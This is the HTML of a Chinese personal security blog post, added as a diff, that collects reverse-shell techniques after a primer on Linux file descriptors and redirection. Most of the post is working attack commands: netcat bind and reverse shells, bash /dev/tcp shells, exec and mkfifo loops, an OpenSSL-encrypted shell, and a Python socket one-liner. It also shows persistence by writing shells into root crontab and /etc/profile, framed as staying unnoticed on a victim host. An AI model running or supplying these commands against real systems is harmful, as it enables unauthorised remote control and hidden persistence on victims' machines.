@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-pace-theme-flash.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<!--
+
+  <script src="//code.tidio.co/oixl41gwhy8tvqy6jte9uvglyrqcjrvc.js" async></script>
+
+-->
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fynch3r.github.io","root":"/","scheme":"Pisces","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+  <meta name="description" content="序言 曲径通幽处，禅房花木深。   抽空总结一下nc经典用法以及反弹shell的多种姿势。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell姿势总结">
+<meta property="og:url" content="https://fynch3r.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="fynch3r的小窝">
+<meta property="og:description" content="序言 曲径通幽处，禅房花木深。   抽空总结一下nc经典用法以及反弹shell的多种姿势。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fynch3r.github.io/images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609100554103.png">
+<meta property="og:image" content="https://fynch3r.github.io/images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102002692.png">
+<meta property="og:image" content="https://fynch3r.github.io/images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102236985.png">
+<meta property="og:image" content="https://fynch3r.github.io/images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609104651585.png">
+<meta property="article:published_time" content="2021-06-08T12:01:51.000Z">
+<meta property="article:modified_time" content="2021-06-15T01:33:20.135Z">
+<meta property="article:author" content="fynch3r">
+<meta property="article:tag" content="shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fynch3r.github.io/images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609100554103.png">
+
+<link rel="canonical" href="https://fynch3r.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>反弹shell姿势总结 | fynch3r的小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="fynch3r的小窝" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+<a href="https://github.com/fynch3r" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#FFA500; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">fynch3r的小窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Trust the process.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">33</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">57</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fynch3r.github.io/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/yfy.png">
+      <meta itemprop="name" content="fynch3r">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fynch3r的小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反弹shell姿势总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-06-08 20:01:51" itemprop="dateCreated datePublished" datetime="2021-06-08T20:01:51+08:00">2021-06-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-15 09:33:20" itemprop="dateModified" datetime="2021-06-15T09:33:20+08:00">2021-06-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" class="post-meta-item leancloud_visitors" data-flag-title="反弹shell姿势总结" title="热度">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">热度：</span>
+              <span class="leancloud-visitors-count"></span>
+              <span>°C</span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
+<p>曲径通幽处，禅房花木深。</p>
+</blockquote>
+<p> 抽空总结一下nc经典用法以及反弹shell的多种姿势。   </p>
+<a id="more"></a>
+
+<h1 id="linux文件描述符和重定向"><a href="#linux文件描述符和重定向" class="headerlink" title="linux文件描述符和重定向"></a>linux文件描述符和重定向</h1><p>在反弹shell的时候疑惑，神奇的<code>&amp;、&lt;、&gt;</code>都是用来做什么的？</p>
+<p>没错，他们就是负责将文件描述符重定向的。</p>
+<h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>linux跟踪打开的文件，并且分配给他一个数字，这个数字用于充当句柄。</p>
+<p>linux启动的时候会自动启动三个文件描述符：</p>
+<ol>
+<li>stdin 标准输入 0 键盘</li>
+<li>stdout 标准输出 1 显示器</li>
+<li>stderr 错误输出 2 显示器</li>
+</ol>
+<p>之后再打开文件，数字自动递增</p>
+<p>并且所有的shell命令都会默认拥有这三个描述符（0，1，2）</p>
+<p>举个例子，如果我们想要把输出的内容输出到文件中，或者想从文件中读取输入，我们需要的是：</p>
+<p><strong>修改数字 ，将文件描述符重定向。</strong></p>
+<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>两种：</p>
+<ol>
+<li>输入重定向 &lt;</li>
+<li>输出重定向 &gt;</li>
+</ol>
+<p>记忆方法：在命令行中，<strong>命令总是在左侧，而重定向符号“指向”数据流动</strong></p>
+<p>默认的重定向会覆盖文件内容，如果想追加 ，可以&lt;&lt; 、&gt;&gt; </p>
+<p>一般0、1、2都写在左侧</p>
+<p>当解析器解析到重定向符号的话，就会先处理重定向。</p>
+<p>就像下面这个小例子：</p>
+<p>输入：输入流默认是0，修改了0的指向，让它指向file.txt，cat自然就会去读标准输入流</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打印文件内容</span><br><span class="line"><span class="keyword">cat</span> 0&lt; <span class="keyword">file</span>.txt</span><br><span class="line"><span class="keyword">cat</span> &lt; <span class="keyword">file</span>.txt</span><br><span class="line">0&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br><span class="line">&lt; <span class="keyword">file</span>.txt <span class="keyword">cat</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：输出流默认是1，修改了1的指向，将输出内容输出到文件file.txt中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">（覆盖）</span></span><br><span class="line">echo hello &gt; file.txt</span><br><span class="line">echo hello 1&gt; file.txt</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br><span class="line"><span class="meta">1&gt;</span><span class="bash"> file.txt <span class="built_in">echo</span> hello</span></span><br></pre></td></tr></table></figure>
+
+<p>将命令结果输出到文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">ls &amp;&gt; result.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件描述符的操作"><a href="#文件描述符的操作" class="headerlink" title="文件描述符的操作"></a>文件描述符的操作</h3><p><strong>模糊输出    &gt;&amp;   &lt;&amp;</strong></p>
+<p>正确、错误都输出到同一个地方（1，2）</p>
+<p><strong>文件描述符重定向</strong></p>
+<p>n&lt;&amp;m n&gt;&amp;m</p>
+<p>以上两种模式都是将n复制到m，只不过分别是只读/写，两种模式</p>
+<p><strong>因此对于 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
+<p><strong>2&gt;&amp;1</strong>  意思就是把 标准错误输出 重定向到(指向) 标准输出，</p>
+<p><strong>&amp; 目的是为了区分数字名字的文件和文件描述符</strong></p>
+<p>如果没有<code>&amp;</code>，系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
+<p>那么下面两种命令是等价的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir &amp;&gt; result.txt</span><br><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令的顺序"><a href="#命令的顺序" class="headerlink" title="命令的顺序"></a>命令的顺序</h3><p>系统读取shell命令永远是从左到右</p>
+<p>顺序不同导致结果不同</p>
+<p>举个例子</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir &gt; result.txt 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准输出重定向到了result.txt，接下来把标准错误输出指向了标准输出，等量代换，最终就是标准错误输出指向指向result.txt</span></span><br><span class="line">mkdir 2&gt;&amp;1 &gt; result.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 首先将标准错误输出指向了标准输出，接下来又把标准输出指向了result.txt，导致链断掉</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>exec I/O重定向</strong></p>
+<p>exec命令就是以新的进程去代替原来的进程，但进程的PID保持不变。因此，可以这样认为，exec系统调用并没有创建新的进程，只是替换了原来进程上下文的内容。原进程的代码段，数据段，堆栈段被新的进程所代替。</p>
+<p>举个例子:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec 55&lt;&gt;test.txt # 创建一个新描述符55 该进程所有的输出重定向到result.txt文件下</span><br><span class="line">ls &gt;&amp;55</span><br><span class="line">cat test.txt # 命令都输出在test.txt里面</span><br><span class="line">exec 55&gt;&amp;- # 销毁55号描述符</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="NetCat基本用法"><a href="#NetCat基本用法" class="headerlink" title="NetCat基本用法"></a>NetCat基本用法</h1><p>几个重要参数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l 开启监听模式</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-vv 显示超级详细信息</span><br><span class="line">-p 本地端口 </span><br><span class="line">-e 程序重定向 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机：A</span><br><span class="line">受害机：B</span><br></pre></td></tr></table></figure>
+
+<h2 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h2><p>原理：</p>
+<p>受害主机将bash交付给5555端口，攻击机连接5555端口即可</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B:nc -lvvp 5555 -e /bin/sh</span><br><span class="line">A:nc [A's IP] 5555</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="反向连接shell"><a href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h2><p>原理：</p>
+<p>攻击机打开自己的6000端口，受害主机主动把自己的shell发送给6000端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lvpp 6000</span><br><span class="line">B:nc [A's IP] 6000 -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="反弹shell多种姿势"><a href="#反弹shell多种姿势" class="headerlink" title="反弹shell多种姿势"></a>反弹shell多种姿势</h1><h2 id="利用Bash"><a href="#利用Bash" class="headerlink" title="利用Bash"></a>利用Bash</h2><p>先写姿势：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -c "bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span><br></pre></td></tr></table></figure>
+
+
+
+<p>之前简单介绍了借助nc来实现，其实bash自己就可以做到发送shell</p>
+<p>Attacker: <code>nc -lvvp 2333</code></p>
+<p>Victim: <code>bash -i &gt;&amp; dev/tcp/[attacker&#39;s ip]/2333 0&gt;&amp;1</code></p>
+<p>一步步看：</p>
+<p><strong>bash -i</strong></p>
+<p>开启交互模式</p>
+<p><strong>/dev/tcp/ip/port</strong></p>
+<p>这是一个十分特殊的文件，直接访问它是不存在的</p>
+<p>但是如果现在有主机A在ip+port监听，那么你对它读写。就可以实现与A的socket通信</p>
+<p>比如:</p>
+<p>攻击机：echo “hello” &gt; /dev/tcp/[attacker’s ip]/6000</p>
+<p>就可以将hello通过socket通信，发送到受害者主机 </p>
+<p>再比如：</p>
+<p>攻击机在<code>nc -lvvp 6000</code>开启本地端口之后，随便在键盘写点东西</p>
+<p>这时候如果受害机<code>cat &lt; /dev/tcp/[attacker&#39;s ip]/6000</code></p>
+<p>就可以看到刚才输入的数字</p>
+<p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609100554103.png" alt="image-20210609100554103"></p>
+<p><strong>bash -i &gt; /dev/tcp/ip/port</strong></p>
+<p>这条命令就是将受害机的输出重定向到ip+port上</p>
+<p>这时候在受害机输入任何命令，结果都会显示在攻击者主机上</p>
+<p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102002692.png" alt="image-20210609102002692"></p>
+<p><strong>bash -i &lt; /dev/tcp/ip/port</strong></p>
+<p>上一个命令仅仅是接受受害机的输入，将命令结果定向到攻击机。还差点意思</p>
+<p>这条命令就是将受害机输入也重定向到Socket的输入</p>
+<p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609102236985.png" alt="image-20210609102236985"></p>
+<p><strong>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</strong></p>
+<p>现在合二为一，这条命令解释一下就是：</p>
+<p>顺序肯定是从左向右，首先将输出1重定向到socket，然后把输入0定向到1，也就是socket</p>
+<p>这样一来，输入和输出都定向到了socket，也就是/dev/tcp/ip/port</p>
+<p>这样就形成了一个回路，完成了远程shell的交互。</p>
+<p><img src="../images/%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/image-20210609104651585.png" alt="image-20210609104651585"></p>
+<p>但是这样在受害机还是能看到有操作痕迹，我们希望”悄无声息”的进行shell交互</p>
+<p>这就需要用到模糊输出，以下两种格式都可以：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>末尾的<code>0&gt;&amp;1和0&lt;&amp;1</code>除了打开方式不同 在这里没区别 看个人习惯</p>
+<p> 第二个命令里面 <code>&gt;&amp; &amp;&gt;</code>都可以</p>
+<h3 id="借助exec"><a href="#借助exec" class="headerlink" title="借助exec"></a>借助exec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<p>新建了一个文件描述符，标号5，让5结合exec重定向到socket</p>
+<p>接下来，将输入设置为5指向的socket</p>
+<p>后半段：<code>while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></p>
+<p>拆开就是:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while read line</span><br><span class="line">do $line &gt;&amp;5 2&gt;&amp;1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>首先从socket中读取一行，复制给line变量</p>
+<p>接下来执行line变量（这一行的内容），然后将结果输出到socket，done结束</p>
+<p>类似的还可以：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<p>应用：</p>
+<ol>
+<li><p>配合curl 将一句话写入受害主机的index.php 然后<code>curl ip | bash</code></p>
+</li>
+<li><p>写入crontab定时任务，但是必须知道用户名</p>
+<p>一般来说，一般都是root</p>
+<p>centos：<code>/var/spool/cron/root</code></p>
+<p>debian：<code>/var/spool/cron/crontabs/root</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">每隔一分钟，发送shell</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一句话版本</span></span><br><span class="line">crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>写入<code>/etc/profile</code>配置文件中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<h2 id="利用NetCat"><a href="#利用NetCat" class="headerlink" title="利用NetCat"></a>利用NetCat</h2><p>刚刚提到了，再写一遍：</p>
+<p>受害者主机回连：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh ip 4000</span><br></pre></td></tr></table></figure>
+
+<p>如果-e 参数用不了怎么办？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip 4000 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>mkfifo首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路。</p>
+<p>还可以：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc ip 4000 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><h3 id="利用OpenSSL"><a href="#利用OpenSSL" class="headerlink" title="利用OpenSSL"></a>利用OpenSSL</h3><p>先生成自签名证书，一路回车：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+
+<p>首先在攻击机上开放4000端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4000</span><br></pre></td></tr></table></figure>
+
+<p>此时 OpenSSL 便在攻击机的4000端口上启动了一个 SSL/TLS server。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect ip:port &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure>
+
